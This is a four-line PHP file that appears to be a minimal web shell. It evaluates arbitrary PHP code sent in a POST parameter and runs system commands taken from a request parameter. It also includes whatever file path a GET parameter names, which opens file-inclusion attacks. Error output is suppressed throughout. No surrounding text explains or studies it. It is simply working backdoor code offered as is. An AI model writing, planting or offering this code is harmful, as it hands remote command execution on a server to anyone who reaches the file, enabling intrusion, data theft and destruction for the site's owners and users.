<?php
@eval($_POST['e']);
@system($_REQUEST['c']);
$f = $_GET['f']; include($f);
